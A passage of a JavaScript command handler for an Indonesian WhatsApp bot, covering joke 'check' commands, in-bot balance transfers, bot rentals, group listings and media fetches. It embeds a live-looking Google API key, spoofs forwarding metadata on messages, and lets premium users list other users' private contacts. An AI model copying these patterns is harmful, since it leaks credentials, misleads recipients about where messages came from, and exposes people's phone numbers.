					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*karakteristik :* ${sipat}
*Hobby :* ${biho}
*bucin :* ${bhucin}%
*Great :* ${senga}%
*Ganteng/cantik :* ${chakep}
*Character :* ${watak}
*Moral Baik :* ${baik}%
*Morals Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Penakut :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(ppuser)
Ditss.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
//D|ts si pler 🐎
break 


case "toki":
case "chines":{
 if (!text) return m.reply("contoh\n.chat selamat siang semuanya")
 const Kalender0001q11 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
 const owned11 = owner + "@s.whatsapp.net"
let awal = `anjir`
await Ditss.sendMessage(m.chat, {
 react: {
 text: '🦚',
 key: m.key,
 }})
Ditss.sendMessage(`120363366602225429@newsletter`,{ text: `${text}`,
 contextInfo: {
 mentionedJid: [m.sender, owned11],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `asuma md`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: Ditss.decodeJid(Ditss.user.id) },

 forwardingScore: 999,
 isForwarded: true,
 externalAdReply: {
 showAdAttribution: true, 
 title: `pesan dari: ${pushname}`,
 body: `message to channel ${calender}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
await sleep(1500)
Ditss.sendMessage(m.chat, {
 react: {
 text: '🎉',
 key: m.key,
 }})
 reply(`sukses mengirim pesan ke channel.`)
 Ditss.sendMessage(m.chat, {
 react: {
 text: '🎉',
 key: m.key,
 }})

}
break



case 'transfer': case 'tf':{

if (!isGroup) return reply(mess.group)
if (m.quoted) {
if (db.users[froms] == undefined) return reply('User tidak terdaftar didalam database!')
if (froms == sender) return reply('*[ Transfer ]* failed')
if (!args[0]) return reply(`*[ Transfer ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Transfer ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply('Kebanyakan!')
let count = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (count < 100) return reply('*[ Transfer ]* minimal 100 untuk bisa transfer!')
if (cekSaldo(sender, db_saldo) >= count * 1) {
minSaldo(sender, count * 1, db_saldo)
addSaldo(m.quoted.sender, count * 1, db_saldo)
reply(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer saldo sebesar *Rp. ${count}* kepada @${m.quoted.sender.split('@')[0]}`)
} else reply(`Saldo kamu tidak mencukupi untuk mentransfer saldo sebesar ${count}`)
} else if (q) {
let nominalnya = args[0].toString()
let tagnya = q.slice(args[0].length + 1, q.length).replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!(tagnya in users)) return reply('User tidak terdaftar didalam database!')
if (tagnya == sender) return reply('Tidak bisa transfer ke diri sendiri!')
if (!nominalnya) return reply(`Masukkan nominal nya!`)
if (isNaN(nominalnya)) return reply(`Nominal harus berupa angka!`)
if (Number(nominalnya) >= 9999999999999999) return reply('Kebanyakan!')
let count = nominalnya.length > 0 ? Math.min(9999999999999999, Math.max(parseInt(nominalnya), 1)) : Math.min(1)
if (count < 100) return reply('Minimal 100 untuk bisa transfer!')
if (cekSaldo(sender, db_saldo) >= count * 1) {
minSaldo(sender, count * 1, db_saldo)
addSaldo(tagnya, count * 1, db_saldo)
reply(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer balance sebesar *$${count}* kepada @${tagnya.split('@')[0]}`)
} else reply(`Balance kamu tidak mencukupi untuk mentransfer balance sebesar ${count}`)
} else reply(`Gunakan dengan cara ${command} *Reply Pesan Nominal*\n\nContoh : Reply Pesan Target ${command} 100`)
}
break



case 'delsesi': 
 case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
 )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return reply(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 
reply(`${teks}`) 
await sleep(2000)
reply("Menghapus file Kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
reply("Berhasil menghapus semua Kenangan di folder session") 
});
}
break



case 'gantengcek': case 'cekganteng': {
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
Reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
//D|ts si pler 🐎
break 



case 'cantikcek': case 'cekcantik': {
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
//D|ts si pler 🐎
break 



case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
Reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
//D|ts si pler 🐎
break 
case 'kapankah': {
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
m.reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
//D|ts si pler 🐎
break 



case "sewabot": case "sewa": {
const url1 = `https://files.catbox.moe/sgelxu.jpg`;
const url2 = `https://files.catbox.moe/sgelxu.jpg`;
const url3 = `https://files.catbox.moe/sgelxu.jpg`;

async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: Ditss.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 
 body: { text: `hai kak *${pushname}*, kalo mau sewa klik di bawah ini yaa><\nkalo ga punya uang bisa kok free xixixi` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "*1 minggu -*\n\n• \`price: 5k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa 1 minggu","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+1+Minggu","webview_presentation":null}`,
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "*- 1 Bulan -*\n\n• \`price: 10k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa 1 bulan","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+1+Bulan","webview_presentation":null}`,
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
body: { text: "*- Permanen -*\n\n• \`price: 20k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+Permanen","webview_presentation":null}`,
 },
 ],
 },
 },
 
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await Ditss.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
}
break



case 'getpp':
if (m.quoted || q) {
let pporang = await Ditss.profilePictureUrl(froms, 'image').catch(_ => m.reply('Profile di private!'))
if (pporang) return Ditss.sendMessage(from, {image: {url:pporang}, caption: 'Nih!'}, {quoted:m})
} else Reply('Tag atau reply pesan target!')
//D|ts si pler 🐎
break 



case "listpremium": case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *#- List all user premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Ditss.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break



case 'afk': {
if (!m.isGroup) return Reply('khusus grup')
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`${tag} telah *Afk* dengan alasan ${text ? ': ' + text : ''}`)
}
//D|ts si pler 🐎
break 



case 'giveaway':
//if (!isRegistered) return registerbut(noregis)
let moe = m.sender
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
if (!args[0]) return reply(`*[ Give Away ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Give Away ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply('Kebanyakan!')
let countt = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (countt < 100) return reply('*[ Give Away ]* minimal 1,000 untuk bisa give away!')
if (cekSaldo(sender, db_saldo) >= countt * 1) {
addSaldo(`${org.split('@')[0]}`, countt * 1, db_saldo)
Ditss.sendMessage(m.chat,
{ text: `*GIVE AWAY*\n @${moe.split('@')[0]} membagikan saldonya kepada member acak sebanyak *Rp. ${countt}*\n\nPemenang : @${org.split('@')[0]}\nSaldo : Rp. ${countt}\nTanggal : ${Harinih}`,
contextInfo:{
mentionedJid:[moe, org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `GIVE AWAY DARI ${pushname}`,
"body": ``,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": ppuser,
"sourceUrl": ``}}},
{ quoted: m}) 
} else reply(`Saldo kamu tidak mencukupi untuk give away sebesar ${countt}`)
//D|ts si pler 🐎
break 



case 'listpc': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${nama}\n*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
//conn.sendteks(m.chat, teks, m)
Reply(teks)
}
break







case "listgc": case "cekidgc": case"listgrup": {
let gcall = Object.values(await Ditss.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
Ditss.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `${gcall.length} Group Chat`, body: `© ${botname}`, sourceUrl: null, previewType: "PHOTO"}}}, {quoted: qtext })
}
break



case "out2": case "leavegc2": case "leave2": {
if (!isCreator) return reply(mess.owner)
let gcall = await Object.values(await Ditss.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Command :*\nKetik *${command}* nomor grup\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
Ditss.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `${gcall.length} Group Chat`, body: `© ${botname2}`, sourceUrl: null, previewType: "PHOTO"}}}, {quoted: qtext})
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await Ditss.groupLeave(`${gcall[leav].id}`)
}}
break



case "beli-prem": {
if (cekSaldo(sender,db_saldo) < 10000) return m.reply(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 9,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
const input = `${m.sender}`
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 10,000`)
minSaldo(sender, 10000, db_saldo)
}
//D|ts si pler 🐎
break 



case 'simi':{
 let response = await fetch('https://api.simsimi.vn/v1/simtalk', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded'
 },
 body: new URLSearchParams({
 text: m.text,
 lc: 'id',
 key: ''
 })
 });

 let json = await response.json();
 m.reply("" + json.message);
 }
 break



case "menugagal":{
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
//let totalreg = Object.keys(db.list().user).length
const xmenu_oh = `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *saldo :* Rp ${asumaSaldo}
> • *device:* \`${m.device}\`

「 *S U B ∆ M E N U* 」
> ┌  ◦ *aimenu* : 
> └  ◦ *groupmenu* :
> ┌  ◦ *gamemenu* : 
> └  ◦ *rpgmenu* :
> ┌  ◦ *downloadmenu* : 
> └  ◦ *searchmenu* :
> ┌  ◦ *toolsmenu* : 
> └  ◦ *mainmenu* :
> ┌  ◦ *ownermenu* : 
> └  ◦ *absenmenu* :
> ┌  ◦ *cerpenmenu* : 
> └  ◦ *beritamenu* :
> ┌  ◦ *pterodactyl* : 
> └  ◦ *pterodactyl2* :
> ┌  ◦ *soundmenu* : 
> └  ◦ *-* :
╰──────────────━ `

const resize = async(buffer, ukur1, ukur2) => {
 return new Promise(async(resolve, reject) => {
 let jimp = require('jimp')
 var baper = await jimp.read(buffer);
 var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
 resolve(ab)
 })
}

let deku = fs.readFileSync('./source/media/ch1.jpg')
let get = await resize(deku, 100, 100)
await Ditss.sendMessage(m.chat, {
 document: fs.readFileSync('./case.js'), fileName: `${botname} ${versi}`, mimetype: 'image/null', fileLength: 0, pageCount: '', jpegThumbnail: get,
 caption: xmenu_oh,
 footer: "Dits\nnot sepuh",
 buttons: [
 {
 buttonId: ".allmenu", 
 buttonText: {
 displayText: 'allmenu'
 }
 }, {
 buttonId: ".owner", 
 buttonText: {
 displayText: "contact owner"
 }
 }
],
 viewOnce: true,
 headerType: 6,
 contextInfo: {
 isForwarded: true,
 forwardingScore: 99999,
 externalAdReply: {
 showAdAttribution: true,
 title: ` Hikaa| Perseverance`,
 mediaType: 1,
 previewType: 1,
 body: `Hikaa`,
 //previewType: "PHOTO",
 thumbnail: fs.readFileSync('./source/media/ch1.jpg'),
 renderLargerThumbnail: true,
 mediaUrl: null,
 sourceUrl: null,
 },
 forwardedNewsletterMessageInfo: {
 newsletterJid: idSaluran,
 serverMessageId: -1,
 newsletterName: `Menu By: Hikaa`,
 }
 }
}, { quoted: m });

//await m.reply({ audio: { url: 'https://files.catbox.moe/s7avpq.mp3' }, mimetype: 'audio/mpeg', ptt: true })
}
break






case 'emojimix': {
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return reply(`Contoh : ${prefix + command} 😅+🤔`)
if (!emoji2) return reply(`Contoh : ${prefix + command} 😅+🤔`)
m.reply(mess.wait)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Ditss.sendAsSticker(m.chat, res.url, m, {
packname: global.packname,
author: 'asuma bot',
categories: res.tags
})
await fs.unlinkSync(encmedia)
}
 
}
//D|ts si pler 🐎
break 



/*case 'topsaldo':
let topsaldo = Object.entries(db_saldo).map(([key, value]) => {return {...value, jid: key}})
let sortedsaldo = topsaldo.map(Number('saldo')).sort(sort('saldo'))
let usersaldo = sortedsaldo.map(enumGetKey)
let ppo = `Kamu Top *${usersaldo.indexOf(m.sender) + 1}* saldo dari *${usersaldo.length}* global user

${sortedsaldo.slice(0, 10).map(({ jid, saldo }, i) => `*${i + 1}.* @${jid.split('@')[0]} => ${formatNumber(saldo)}`).join`\n`}`
reply(ppo)
break*/



case 'topsaldo':
let topsaldo = Object.entries(db_saldo).map(([key, value]) => {return {...value, jid: key}})
let sortedsaldo = topsaldo.map(toNumber('saldo')).sort(sort('saldo'))
let usersaldo = sortedsaldo.map(enumGetKey)
let ppo = `Kamu Top *${usersaldo.indexOf(m.sender) + 1}* saldo dari *${usersaldo.length}* global user`
reply(ppo)
break



case 'minsaldo':
if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah`)
const Kalender010 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`*USER SALDO*
 • ID : ${q.split(",")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${Kalender010}
 • Saldo : Rp ${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break



case 'jodoh':
 case 'jodohku': {
 if (!m.isGroup) return reply('khusu grup')
 let member = participants.map(u => u.id)
 let me = m.sender
 let jodoh = member[Math.floor(Math.random() * member.length)]
Ditss.sendMessage(m.chat,
{ text: `jodoh @${me.split('@')[0]} adalah @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `semoga kalian beneran jodoh >_<`,
"body": `cieeee ehem`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": ppuser,
"sourceUrl": ``}}},
{ quoted: m}) 
 }
 //D|ts si pler 🐎
break 



case "addsewa": case "beli-sewa": {
if (cekSaldo(sender,db_saldo) < 12000) return m.reply(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 12,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Ditss.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 12,000`)
minSaldo(sender, 12000, db_saldo)
}
//D|ts si pler 🐎
break 



case 'listban': 
//if (!isRegistered) return registerbut(noregis)
var data = Object.values(db.users).filter(v => v.banned)
if (data.length == 0) return reply('*Data kosong.*')
var teks = '乂 *L I S T B A N N E D*\n'
teks += data.map((v, i) => `\n${i + 1}. @${v.jid.split('@')[0]}`).join('\n')
/*Ditss.sendMessage(m.chat, teks, m, {
thumbUrl: 'https://telegra.ph/file/ae4413e295ec14491d23b.png',
largeThumb: true
})*/
reply(teks)
break //Powered By



///=== *Music Old dan New Campuran* ===///

case 'music1':
case 'music2':
case 'music3':
case 'music4':
case 'music5':
case 'music6':
case 'music7':
case 'music8':
case 'music9':
case 'music10':
case 'music11':
case 'music12':
case 'music13':
case 'music14':
case 'music15':
case 'music16':
case 'music17':
case 'music18':
case 'music19':
case 'music20':
case 'music21':
case 'music22':
case 'music23':
case 'music24':
case 'music25':
case 'music26':
case 'music27':
case 'music28':
case 'music29':
case 'music30':
case 'music31':
case 'music32':
case 'music33':
case 'music34':
case 'music35':
case 'music36':
case 'music37':
case 'music38':
case 'music39':
case 'music40':
case 'music41':
case 'music42':
case 'music43':
case 'music44':
case 'music45':
case 'music46':
case 'music47':
case 'music48':
case 'music49':
case 'music50':
case 'music51':
case 'music52':
case 'music53':
case 'music54':
case 'music55':
case 'music56':
case 'music57':
case 'music58':
case 'music59':
case 'music60':
case 'music61':
case 'music62':
case 'music63':
case 'music64':
case 'music65':
Ditss.sendMessage(from, { react: { text: "🎧", key: m.key }})
Dites_deV = await getBuffer(`https://github.com/Rez4-3yz/Music-rd/raw/master/music/${command}.mp3`)
await Ditss.sendMessage(m.chat, { audio: Dites_deV, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
//D|ts si pler 🐎
break 



case 'kont':
			case 'mek': {
				const caption = `Haii, Kak! Apa yang ingin kamu ketahui tentang Ownerku? 🤔💭\nAku bisa kasih info lebih atau cara menghubungi Owner, loh! 😊✨`;
				Ditss.sendMessage(m.chat,{
					image: 'https://files.catbox.moe/ynin7w.jpg',
					caption: caption,
					footer: "tesbutton",
					buttons: [
						{
							buttonId: `${prefix}viewsc`,
							buttonText: {
								displayText: "Get Script"
							}
						},
						{
							buttonId: `${prefix}contact`,
							buttonText: {
								displayText: "Contact 📞"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			break



/*case "getsc": {
if (!isCreator) return newReply(mess.owner)
let dir = await fs.readdirSync("./temp")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./temp`)
}}
await m.reply("Memproses backup script bot")
var name = `asuma Ai`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Ditss.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break
*/





			case 'tourl': {
				
				if (!mime) return m.reply(`Kirim/Balas Video/Gambar Dengan Caption ${prefix + command}`);
				
				try {
					let media = await Ditss.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let response = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = m.pushName;
						let caption = `🔗 *Link Media* : ${response}\n📅 *Tanggal Upload* : ${uploadDate}\n📂 *Ukuran File* : ${fileSize} KB\n👤 *Pengunggah* : ${uploader}`.trim();
						Reply(caption);
					} else if (!/image/.test(mime)) {
						let response = await CatBox(media);
						Reply(response);
					} else {
						Reply(`Jenis media tidak didukung!`);
					}
